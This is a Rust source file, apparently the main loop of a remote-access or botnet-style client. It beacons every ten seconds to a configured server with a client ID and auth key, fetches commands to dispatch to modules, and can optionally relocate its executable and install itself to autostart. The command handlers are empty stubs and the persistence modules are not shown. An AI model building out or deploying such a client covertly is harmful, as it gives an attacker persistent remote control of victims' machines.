const SERVER: &str = env!("REMOTE_SERVER");
const AUTH_KEY: &str = env!("AUTH_KEY");
const CLIENT_ID: &str = env!("CLIENT_ID");

mod features;
use std::time::Duration;

use combine_rust::combine;
use serde::Deserialize;

pub mod module_manager;

#[tokio::main]
async fn main() {
    #[cfg(feature = "executable_move")]
    features::executable_move::auto_move_executable();

    #[cfg(feature = "auto_start")]
    features::auto_start::write_autostart();

    let api = combine::Combine::new(SERVER, "clientApi.js").await;

    loop {
        let result: FetchCommandsResult = match api
            .run_combine_function(
                "get",
                combine::CombineArguments::new()
                    .push(CLIENT_ID)
                    .push(AUTH_KEY),
            )
            .await
        {
            Ok(result) => result,
            Err(err) => {
                print!("Error {}", err);
                repeat_sleep();
                continue;
            }
        };

        if result.success == false {
            match result.error {
                Some(err) => {
                    print!("Error {}", err);
                    repeat_sleep();
                    continue;
                }
                None => {
                    print!("Error {}", "unknown error");
                    repeat_sleep();
                    continue;
                }
            }
        }

        for command in result.commands {
            command_matcher(&command);
        }

        repeat_sleep();
    }
}

fn repeat_sleep() {
    std::thread::sleep(Duration::new(10, 0));
}

fn command_matcher(command: &FetchCommand) {
    match command.module.as_str() {
        #[cfg(feature = "display")]
        "display" => {
            //features::display::
        }

        any => {
            print!("Module {} does not exist or is not enabled", any)
        }
    }
}

#[derive(Deserialize)]
struct FetchCommand {
    module: String,
    function: String,
    args: serde_json::Value,
}

#[derive(Deserialize)]
struct FetchCommandsResult {
    success: bool,
    error: Option<u8>,
    commands: Vec<FetchCommand>,
}
